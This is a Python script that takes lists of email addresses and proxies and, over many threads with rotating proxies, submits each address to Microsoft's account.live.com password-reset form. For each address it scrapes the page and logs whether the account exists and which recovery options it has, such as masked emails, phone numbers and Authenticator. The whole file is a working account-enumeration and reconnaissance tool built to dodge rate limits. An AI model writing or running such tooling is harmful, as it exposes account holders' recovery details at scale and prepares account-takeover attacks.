import requests
from bs4 import BeautifulSoup as bs
import json
import queue
import os

from multiprocessing.pool import ThreadPool
import multiprocessing

lock = multiprocessing.Lock()

headers = {
    "Content-Type":"application/x-www-form-urlencoded",
    "Accept-Encoding":"gzip, deflate",
    "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
    "DNT":"1",
    "Connection":"keep-alive",
    "Origin":"https://account.live.com",
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language":"en-US,en;q=0.5",
    "Referer":"https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf",
    "TE":"Trailers",
    "Upgrade-Insecure-Requests":"1",
}


emails = queue.Queue(); [emails.put(line.strip()) for line in open("emails.txt")]
proxies = queue.Queue(); [proxies.put(line.strip()) for line in open("proxies.txt")]


def get_proxy():
    if proxies.empty():
        print("There are no more proxies")
        os._exit(1)
    else:
        with lock:
            return proxies.get()



def main(_):
    s = requests.Session()    
    s.headers.update(headers)

    proxy = get_proxy()
    s.proxies = {"http":"http://"+proxy, "https":"https://"+proxy}

    while not emails.empty():
        with lock:
            EMAIL = emails.get()


        try:
            page = s.get("https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf", timeout=30)
            obj = bs(page.text, 'html.parser')
        except:
            emails.put(EMAIL)
            proxy = get_proxy()
            s.proxies = {"http":"http://"+proxy, "https":"https://"+proxy}
            continue

        data = {
            "iAction":obj.find("input", attrs={"id":"iAction"})['value'],
            "iRU":obj.find("input", attrs={"id":"iRU"})['value'],
            "amtcxt":obj.find("input", attrs={"id":"amtcxt"})['value'],
            "uaid":obj.find("input", attrs={"id":"uaid"})['value'],
            "network_type":obj.find("input", attrs={"id":"network_type"})['value'],
            "isSigninNamePhone":obj.find("input", attrs={"id":"isSigninNamePhone"})['value'],
            "canary":obj.find("input", attrs={"id":"canary"})['value'],
            "PhoneCountry":"US",
            "iSigninName":EMAIL,
        }

        try:
            resp = s.post(obj.find("form", attrs={"id":"resetPwdForm"})['action'], data=data, timeout=30)
        except Exception as e:
            print(f"Failed to post: {e}")
            emails.put(EMAIL)
            proxy = get_proxy()
            s.proxies = {"http":"http://"+proxy, "https":"https://"+proxy}
            continue


        if "https://account.live.com/acsr" in resp.url:
            with lock:
                with open("results.txt", 'a') as f:
                    f.write(f"{EMAIL} - No reset options\n")
            continue





        obj = bs(resp.text, 'html.parser')
        a = obj.find_all("script", attrs={"type":"text/javascript"})

        z = None
        for el in a:
            if "var t0={" in el.text:
                z = el

        try:
            j = '[' + z.text.split('"proofList":[')[1].split("],")[0] + ']'
            j = json.loads(j)
        except Exception as e:
            print(f"Failed at proof list: {e}")
            with lock:
                with open("results.txt", 'a') as f:
                    f.write(f"{EMAIL} - This Microsoft account doesn't exist\n")
            continue


        details = "|".join([el['name'] for el in j])

        for z in j:
            if "TOTP" in z["partialSelectValue"]:
                details += "|Authenticator"
                break

        with lock:
            with open("results.txt", 'a') as f:
                f.write(f"{EMAIL}|{details}\n")


amount_of_threads = int(input("Amount of threads\n> "))

worker_pool = ThreadPool(amount_of_threads)
worker_pool.map(main, list(range(amount_of_threads)))
worker_pool.close()
worker_pool.join()
